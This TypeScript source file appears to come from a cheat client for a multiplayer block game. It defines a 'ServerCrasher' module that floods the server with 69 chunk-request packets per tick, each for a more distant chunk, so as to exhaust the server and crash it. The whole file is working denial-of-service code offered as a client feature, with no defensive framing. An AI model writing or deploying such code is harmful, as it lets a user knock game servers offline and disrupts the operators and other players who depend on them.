import { Subscribe } from "@/event/api/Bus";
import { c2s } from "@/utils/packetRefs";
import Refs from "@/utils/refs";
import Category from "../../api/Category";
import Mod from "../../api/Module";

const SERVER_CRASHER_CHUNK_XZ_INCREMENT = 16;
const PACKETS_PER_TICK = 69;

export default class ServerCrasher extends Mod {
	public name = "ServerCrasher";
	public category = Category.UTILITY;
	private x = 10;
	private z = 10;

	protected onEnable(): void {
		this.x = 10;
		this.z = 10;
	}

	@Subscribe("gameTick")
	onTick() {
		for (let _ = 0; _ < PACKETS_PER_TICK; _++) {
			this.x += SERVER_CRASHER_CHUNK_XZ_INCREMENT;
			this.z += SERVER_CRASHER_CHUNK_XZ_INCREMENT;
			Refs.ClientSocket.sendPacket(
				new (c2s("SPacketRequestChunk"))({
					x: this.x,
					z: this.z,
				}),
			);
		}
	}
}
